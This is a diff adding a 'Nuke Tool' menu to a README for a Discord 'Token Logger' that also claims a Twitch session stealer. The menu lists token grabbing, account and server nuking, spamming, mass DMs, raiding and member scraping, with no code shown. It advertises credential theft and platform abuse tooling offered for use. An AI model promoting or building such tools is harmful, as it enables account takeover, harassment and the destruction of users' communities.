@@ -98,6 +98,22 @@ This Token Logger Has Multi Tools. Its is very easy To setup. This is the V2 Ver
 
 - Twitch Session stealer & validator
 
+Nuke Tool
+-------------------------------------------------------------------------------------------
+                                    Nuking tool 
+
+     [01] Token Checker   [06] Token Grabber   [11] Member Checker  [16] Nitro Checker
+     [02] Token Onliner   [07] Token Nuker     [12] Member Scraper  [17] Vanity Sniper
+     [03] Token Joiner    [08] Token Login     [13] Server Nuker    [18] HypeS Joiner
+     [04] Token Leaver    [09] Token Name      [14] Server Info     [19] PFP Changer
+     [05] Token Sorter    [10] Token Info      [15] CMDS Nuker      [20] Next Page 
+     [21] Channel Spammer [26] Button Presser  [31] Webhook Tools   [36] DM Deleter
+     [22] Threads Spammer [27] Fake Typing     [32] Proxy Fetcher   [37] Activity
+     [23] Voice Spammer   [28] BOT Mass DM     [33] Basic Raider    [38] Unreact
+     [24] Remove Dupes    [29] Pronounce       [34] Status          [39] Patch Notes
+     [25] Dump Friends    [30] Seizure         [35] React           [40] Previous Page
+
+
 **Note's**
 ----------------------------------------------------------------------------------------------------------
 **If there is something you want me to add to this project  you can contact me via Discord**
